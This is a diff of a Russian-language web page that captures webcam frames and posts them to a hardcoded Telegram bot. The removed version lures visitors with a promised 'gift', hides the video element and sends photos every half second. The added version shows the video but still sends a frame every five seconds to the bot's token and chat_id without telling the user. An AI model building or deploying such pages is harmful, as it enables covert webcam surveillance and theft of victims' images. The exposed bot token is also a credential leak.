@@ -3,73 +3,75 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Доступ к камере</title>
+  <title>Фото с камеры</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-sky-950 flex items-center justify-center h-screen flex-col space-y-6">
-  <h1 class="text-4xl text-center text-amber-400 animate-pulse">
-    Подождите немного, чтобы получить подарок!
-  </h1>
-  
-  <!-- Видео прозрачно, но видно браузеру -->
-  <video id="video" autoplay playsinline muted class="opacity-0 absolute pointer-events-none w-[640px] h-[480px]"></video>
+<body class="bg-gray-900 flex flex-col items-center justify-center min-h-screen text-white space-y-4">
+  <h1 class="text-2xl text-center text-amber-300">Разрешите доступ к камере</h1>
+
+  <!-- Сделаем видео видимым -->
+  <video id="video" autoplay playsinline muted class="rounded-xl shadow-lg w-[300px] h-[auto] border-2 border-amber-400"></video>
+
+  <canvas id="canvas" class="hidden"></canvas>
 
   <script>
-    // Спросить имя пользователя (необязательно)
-    const ism = prompt("Введите своё имя пользователя");
-
     const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
-    // Запрашиваем доступ к камере
+    // Получаем доступ к камере
     navigator.mediaDevices.getUserMedia({ video: true })
       .then((stream) => {
         video.srcObject = stream;
 
-        // Дожидаемся полной загрузки метаданных
         video.onloadedmetadata = () => {
           video.play();
+          console.log("Камера запущена");
 
-          // Начинаем отправлять фото каждые 5 секунд
-          setInterval(sendPhoto, 500);
+          // Установка размеров canvas под видео
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          // Начать отправку каждые 5 секунд
+          setInterval(captureAndSend, 5000);
         };
       })
       .catch((err) => {
-        console.error("Ошибка при доступе к камере:", err);
-        alert("Не удалось получить доступ к камере. Разрешите доступ вручную.");
+        console.error("Ошибка доступа к камере:", err);
+        alert("Ошибка доступа к камере. Разрешите использовать камеру.");
       });
 
-    // Функция для отправки фото в Telegram
-    function sendPhoto() {
-      // Убедимся, что видео готово
-      if (video.videoWidth === 0 || video.videoHeight === 0) {
-        console.warn("Камера ещё не готова");
+    function captureAndSend() {
+      if (video.readyState !== 4) {
+        console.warn("Видео не готово");
         return;
       }
 
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const context = canvas.getContext("2d");
+      // Отрисовываем кадр на canvas
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Захватываем изображение с камеры
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Преобразуем в blob и отправляем
+      // Преобразуем в blob
       canvas.toBlob((blob) => {
+        if (!blob) {
+          console.error("Blob пустой — возможно, изображение чёрное");
+          return;
+        }
+
         const formData = new FormData();
-        formData.append("chat_id", "1347186841"); // Заменить на свой chat_id
+        formData.append("chat_id", "1347186841"); // свой chat_id
         formData.append("photo", blob);
 
+        // Отправка в Telegram
         fetch("https://api.telegram.org/bot7963148627:AAHGkT746bxkUEnGH0UC5-rV0nd2tDpFKkg/sendPhoto", {
           method: "POST",
           body: formData
         })
         .then((res) => {
-          if (!res.ok) throw new Error("Ошибка при отправке фото");
+          if (!res.ok) throw new Error("Ошибка отправки фото");
           console.log("Фото успешно отправлено");
         })
         .catch((err) => {
-          console.error("Ошибка отправки:", err);
+          console.error("Ошибка:", err);
         });
       }, "image/jpeg");
     }
